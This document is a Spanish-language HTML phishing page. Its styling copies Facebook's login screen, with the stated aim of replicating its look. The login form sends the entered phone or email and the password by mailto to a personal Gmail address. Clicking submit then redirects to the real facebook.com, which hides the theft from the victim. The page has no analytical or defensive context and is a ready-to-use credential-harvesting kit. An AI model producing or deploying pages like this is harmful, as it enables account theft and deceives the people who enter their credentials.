<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        /* Estilos para replicar la apariencia de Facebook */
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
        }
       .fb-header {
            background-color: #3b5998;
            padding: 10px;
            text-align: center;
        }
       .fb-header img {
            width: 100px;
            height: 100px;
        }
       .fb-login-form {
            width: 300px;
            margin: 40px auto;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
       .fb-login-form label {
            display: block;
            margin-bottom: 10px;
        }
       .fb-login-form input[type="text"],.fb-login-form input[type="password"] {
            width: 100%;
            height: 30px;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
        }
       .fb-login-form input[type="submit"] {
            width: 100%;
            height: 30px;
            padding: 10px;
            background-color: #4267b2;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
       .fb-login-form input[type="submit"]:hover {
            background-color: #365899;
        }
       .forgot-password {
            margin-top: 10px;
            text-align: right;
        }
       .forgot-password a {
            color: #365899;
            text-decoration: none;
        }
       .create-account {
            margin-top: 20px;
            text-align: center;
        }
       .create-account a {
            color: #365899;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="fb-header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1c/Facebook_logo_%282021%29.svg/1200px-Facebook_logo_%282021%29.svg.png" alt="Facebook Logo">
    </div>
    <form action="mailto:cieloexenes@gmail.com" method="post" enctype="text/plain" class="fb-login-form">
        <label for="email">Celular o correo electrónico</label>
        <input type="text" id="email" name="email" placeholder="Celular o correo electrónico">
        <label for="password">Contraseña</label>
        <input type="password" id="password" name="password" placeholder="Contraseña">
        <input type="submit" value="Iniciar sesión" onclick="window.location.href='https://www.facebook.com'">
        <div class="forgot-password">
            <a href="#">¿Olvidaste tu contraseña?</a>
        </div>
        <div class="create-account">
            <a href="#">Crear cuenta nueva</a>
        </div>
    </form>
</body>
</html>
